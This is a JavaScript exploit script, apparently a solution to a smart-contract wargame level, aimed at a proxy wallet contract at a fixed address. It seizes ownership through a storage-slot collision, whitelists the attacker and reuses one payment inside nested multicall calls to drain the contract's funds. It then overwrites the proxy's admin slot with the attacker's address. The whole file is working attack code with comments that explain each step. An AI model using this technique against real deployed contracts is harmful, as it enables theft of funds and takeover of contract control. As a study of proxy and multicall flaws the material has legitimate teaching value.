const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0xfB9597e45E79Bfe195F3FaA209b902b11FBCABB3'
const abi = [
    "function proposeNewAdmin(address _newAdmin) external",
    "function multicall(bytes[] calldata data) external payable",
    "function deposit()",
    "function execute(address to, uint256 value, bytes calldata data)",
    "function addToWhitelist(address addr) external",
    "function setMaxBalance(uint256 _maxBalance) external",
    "function admin() external view returns (address)",
    "function whitelisted(address addr) external view returns (bool)",
]

async function hack(contract, signer) {
    // Use the Proxy contract function to rewrite colliding storage slot of owner.
    const newAdminTx = await contract.proposeNewAdmin(signer.address);
    await newAdminTx.wait();
    console.log("New Owner:", await contract.owner());

    // Now that I'm the owner, add myself to the whitelist too.
    const addToWhiteListTx = await contract.addToWhitelist(signer.address);
    await addToWhiteListTx.wait();
    console.log("Is your address on the whitelist?", await contract.whitelisted(signer.address));

    // Encode the three transactions for multicall: 
    const depositEncoded = contract.interface.encodeFunctionData("deposit()", []);
    // The contract only allows deposit to be called once, but you can recall multicall to deposit again with the same msg.value.
    const multiDepositEncoded = contract.interface.encodeFunctionData("multicall(bytes[])", [[depositEncoded]]);
    const executeEncoded = contract.interface.encodeFunctionData("execute(address,uint256,bytes)", [
        signer.address,
        ethers.utils.parseEther("0.002"),
        []
    ]);

    // Perform the multicall to deposit & then drain the funds.
    const MultiTx = await contract.multicall(
        [depositEncoded, multiDepositEncoded, executeEncoded], 
        {value: ethers.utils.parseEther("0.001")}
    );
    await MultiTx.wait();
    console.log("Funds Drained!")

    // Now that the balance is zero, you're able to set the max balance. 
    // This collides with the admin of the Proxy contract, so set it to the integer that corresponds to your own account.
    const addrAsNumber = ethers.BigNumber.from(signer.address)
    const setMaxBalanceTx = await contract.setMaxBalance(addrAsNumber)
    await setMaxBalanceTx.wait();

    // Tada!
    console.log("New Admin:", await contract.admin());
    console.log("Contract hacked.")
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})